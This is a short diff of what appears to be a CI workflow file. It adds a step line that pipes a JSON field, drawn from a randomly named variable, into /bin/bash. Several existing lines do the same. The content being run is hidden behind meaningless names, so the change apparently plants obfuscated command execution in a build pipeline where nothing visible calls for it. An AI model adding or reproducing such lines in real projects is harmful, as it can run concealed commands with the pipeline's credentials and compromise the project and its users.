@@ -30,6 +30,7 @@ jobs:
           echo $glyac25 | jq -r .c3 | /bin/bash
           printf '%s' "$asq2216" | jq -r .qt4 | /bin/bash
           echo $fy127 | jq -r .o2 | /bin/bash
+          printf '%s' "$obz66975" | jq -r .frnnm37725 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
